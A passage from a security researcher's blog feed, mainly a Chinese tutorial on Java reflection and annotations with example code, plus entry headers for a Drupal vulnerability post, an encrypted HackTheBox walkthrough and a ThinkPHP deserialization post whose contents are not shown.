href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/由phpggc理解php反序列化漏洞/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Durpal历史漏洞复现记录&quot;&gt;Durpal历史漏洞复现记录&lt;/h1&gt;
&lt;p&gt;在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/u
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java基础学习之反射和注解</title>
    <link href="http://ca0y1h.top/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/"/>
    <id>http://ca0y1h.top/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-01-22T13:31:59.000Z</published>
    <updated>2021-03-09T07:02:15.514Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础学习之反射和注解">Java基础学习之反射和注解</h1><p>Reference:</p><p><a href="https://liaoxuefeng.com">https://liaoxuefeng.com</a></p><p><a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><h2 id="0x01-反射">0x01 反射</h2><h3 id="反射概念">反射概念</h3><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><h3 id="java反射机制流程图">java反射机制流程图</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309150130.png" alt=""></p><p>比如我们创建了一个类文件，经过javac编译之后，就会形成class文件，同时jvm内存会查找生成的class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取成员变量Field，成员方法Method和构造方法Constructor等方法。最后就是我们平时new创建对象。</p><p>这里其实跟我们了解到java运行体系没有很大区别，只是我们生成class文件的时候，也创建了Class对象。而Class是java.lang.Class类中，是所有类的的类。而类是java.lang.Class类的实例对象，所以我们的反射机制本身不复杂，就是获取一个类的Class对象，然后在用Class对象中的获取成员变量Field，成员方法Method和构造方法Constructor等方法，再去动态获取一个类或者调用一个类的属性，变量，构造方法等方式。</p><h3 id="Class类">Class类</h3><p>JVM每加载一种<code>class</code>，就为其创建一个<code>Class</code>实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>，形如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以String类为例，当JVM加载String类的时候，首先会读取<code>String.class</code>到内存，然后，为<code>String</code>类创建一个<code>Class</code>实例并关联起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = <span class="keyword">new</span> Class(String);</span><br></pre></td></tr></table></figure><p>JVM持有的每个<code>Class</code>实例都指向一个数据类型（<code>class</code>或<code>interface</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Random</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.util.Random&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Runnable</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.Runnable&quot;│</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure><p>一个<code>Class</code>实例包含了该<code>class</code>的所有完整信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│package &#x3D; &quot;java.lang&quot;      │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│super &#x3D; &quot;java.lang.Object&quot; │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│interface &#x3D; CharSequence...│</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│field &#x3D; value[],hash,...   │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│method &#x3D; indexOf()...      │</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure><p>由于JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><p>这种通过<code>Class</code>实例获取<code>class</code>信息的方法称为反射（Reflection）。</p><p>获取一个<code>class</code>的<code>Class</code>实例有三种方法：</p><p>方法一：直接通过一个<code>class</code>的静态变量<code>class</code>获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls &#x3D; String.class;</span><br></pre></td></tr></table></figure><p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的<code>getClass()</code>方法获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello&quot;;</span><br><span class="line">Class cls &#x3D; s.getClass();</span><br></pre></td></tr></table></figure><p>方法三：如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls &#x3D; Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure><h3 id="访问字段">访问字段</h3><p><code>Class</code>类提供了以下几个方法来获取字段：</p><ul><li>Field getField(name)：根据字段名获取某个public的field（包括父类）</li><li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li><li>Field[] getFields()：获取所有public的field（包括父类）</li><li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</li></ul><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113344.png" alt=""></p><p>一个<code>Field</code>对象包含了一个字段的所有信息：</p><ul><li><code>getName()</code>：返回字段名称，例如，<code>&quot;name&quot;</code>；</li><li><code>getType()</code>：返回字段类型，也是一个<code>Class</code>实例，例如，<code>String.class</code>；</li><li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><p>还是以上面这段代码为例：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113943.png" alt=""></p><h4 id="获取字段值">获取字段值</h4><p>利用反射拿到字段的一个<code>Field</code>实例之后，可以拿到一个实例对应的该字段的值：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115216.png" alt=""></p><p>如果不调用<code>Field.setAccessible(true)</code>，就会抛出一个<code>IllegalAccessException</code>的错误，这是因为<code>name</code>字段被定义成<code>private</code>。</p><h4 id="设置字段值">设置字段值</h4><p>除了使用get方法获取字段值，还可以用set方法获取字段值：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115646.png" alt=""></p><p>同样，修改非<code>public</code>字段，需要首先调用<code>setAccessible(true)</code>。</p><h3 id="调用方法">调用方法</h3><p><code>Class</code>类提供了以下几个方法来获取<code>Method</code>：</p><ul><li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li><li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li></ul><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118121523.png" alt=""></p><p>一个<code>Method</code>对象包含一个方法的所有信息：</p><ul><li><code>getName()</code>：返回方法名称，例如：<code>&quot;getScore&quot;</code>；</li><li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：<code>String.class</code>；</li><li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：<code>&#123;String.class, int.class&#125;</code>；</li><li><code>getModifiers()</code>：返回方法的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><p>当我们获取到一个<code>Method</code>对象时，就可以对它进行调用。我们以下面的代码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello world&quot;;</span><br><span class="line">String r &#x3D; s.substring(6); &#x2F;&#x2F; &quot;world&quot;</span><br></pre></td></tr></table></figure><p>如果用反射来调用<code>substring</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145036.png" alt=""></p><h4 id="调用静态方法">调用静态方法</h4><p>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以<code>invoke</code>方法传入的第一个参数永远为<code>null</code>。以<code>Integer.parseInt(String)</code>为例：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145348.png" alt=""></p><h4 id="调用非public方法">调用非public方法</h4><p>和Field类似，对于非public方法，我们虽然可以通过<code>Class.getDeclaredMethod()</code>获取该方法实例，但直接对其调用将得到一个<code>IllegalAccessException</code>。为了调用非public方法，我们通过<code>Method.setAccessible(true)</code>允许其调用：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145724.png" alt=""></p><h4 id="多态">多态</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118150644.png" alt=""></p><p>一个<code>Person</code>类定义了<code>hello()</code>方法，并且它的子类<code>Student</code>也覆写了<code>hello()</code>方法，那么，从<code>Person.class</code>获取的<code>Method</code>，作用于<code>Student</code>实例时，同样会遵循多态原则，实际调用的是<code>Student</code>类的<code>hello()</code>方法。</p><h3 id="调用构造方法">调用构造方法</h3><p>Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118152642.png" alt=""></p><p>通过Class实例获取Constructor的方法如下：</p><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li><li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li></ul><h3 id="获取继承关系">获取继承关系</h3><h4 id="获取父类class">获取父类class</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118163859.png" alt=""></p><h4 id="获取interface">获取interface</h4><p>由于一个类可能实现一个或多个接口，通过<code>Class</code>我们就可以查询到实现的接口类型。例如，查询<code>String</code>实现的接口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118164136.png" alt=""></p><h3 id="动态代理">动态代理</h3><p><a href="https://www.jianshu.com/p/95970b089360">https://www.jianshu.com/p/95970b089360</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118170645.png" alt=""></p><p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</li><li>通过<code>Proxy.newProxyInstance()</code>创建<code>interface</code>实例，它需要3个参数：<ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li></ol></li><li>将返回的<code>Object</code>强制转型为接口。</li></ol><h2 id="0x02-注解">0x02 注解</h2><h3 id="常用的元注解">常用的元注解</h3><h4 id="Target">@Target</h4><p>使用<code>@Target</code>可以定义<code>Annotation</code>能够被应用于源码的哪些位置：</p><ul><li>类或接口：<code>ElementType.TYPE</code>；</li><li>字段：<code>ElementType.FIELD</code>；</li><li>方法：<code>ElementType.METHOD</code>；</li><li>构造方法：<code>ElementType.CONSTRUCTOR</code>；</li><li>方法参数：<code>ElementType.PARAMETER</code>。</li></ul><h4 id="Retention">@Retention</h4><p>元注解<code>@Retention</code>定义了<code>Annotation</code>的生命周期：</p><ul><li>仅编译期：<code>RetentionPolicy.SOURCE</code>；</li><li>仅class文件：<code>RetentionPolicy.CLASS</code>；</li><li>运行期：<code>RetentionPolicy.RUNTIME</code>。</li></ul><p>如果<code>@Retention</code>不存在，则该<code>Annotation</code>默认为<code>CLASS</code>。</p><h3 id="如何定义Annotation">如何定义Annotation</h3><p>我们总结一下定义<code>Annotation</code>的步骤：</p><p>第一步，用<code>@interface</code>定义注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，添加参数、默认值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把最常用的参数定义为<code>value()</code>，推荐所有参数都尽量设置默认值。</p><p>第三步，用元注解配置注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，必须设置<code>@Target</code>和<code>@Retention</code>，<code>@Retention</code>一般设置为<code>RUNTIME</code>，因为我们自定义的注解通常要求在运行期读取。</p><h3 id="使用注解">使用注解</h3><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(min = 1, max = 20)</span></span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(max = 10)</span></span><br><span class="line"><span class="keyword">public</span> String city;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(min = 1, max = 100)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, String city, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.city = city;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;Person: name=%s, city=%s, age=%d&#125;&quot;</span>, name, city, age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Range.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Beijing&quot;</span>, <span class="number">20</span>);</span><br><span class="line">Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">20</span>);</span><br><span class="line">Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">199</span>);</span><br><span class="line"><span class="keyword">for</span> (Person p : <span class="keyword">new</span> Person[] &#123; p1, p2, p3 &#125;) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">check(p);</span><br><span class="line">System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked ok.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked failed: &quot;</span> + e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> IllegalArgumentException, ReflectiveOperationException </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">Range range = field.getAnnotation(Range.class);</span><br><span class="line"><span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">Object value = field.get(person);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="keyword">if</span> (value <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">String s = (String) value;</span><br><span class="line"><span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid name&quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Integer)&#123;</span><br><span class="line">Integer i = (Integer) value;</span><br><span class="line"><span class="keyword">if</span> (i &lt; range.min() || i &gt; range.max())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid age&quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person &#123;Person: name=Bob, city=Beijing, age=<span class="number">20</span>&#125; checked ok.</span><br><span class="line">Person &#123;Person: name=, city=Shanghai, age=<span class="number">20</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid namename</span><br><span class="line">Person &#123;Person: name=Alice, city=Shanghai, age=<span class="number">199</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid ageage</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java基础学习之反射和注解&quot;&gt;Java基础学习之反射和注解&lt;/h1&gt;
&lt;p&gt;Reference:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://liaoxuefeng.com&quot;&gt;https://liaoxuefeng.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="编程" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"/>
    
    
      <category term="java" scheme="http://ca0y1h.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Doctor-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/</id>
    <published>2021-01-22T13:23:10.000Z</published>
    <updated>2021-01-31T04:08:43.779Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fb043ad81f0c53c870662d070af0314825921d4b2bdae224f6304c2bb5f15d29"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>TP3.0反序列化POP链+MySQL伪造恶意服务端</title>
    <link href="http://ca0y1h.top/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    <id>http://ca0y1h.top/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/</id>
    <published>2021-01-21T07:06:32.000Z</published>
    <updated>2021-01-21T07:07:48.691Z</updated>
    
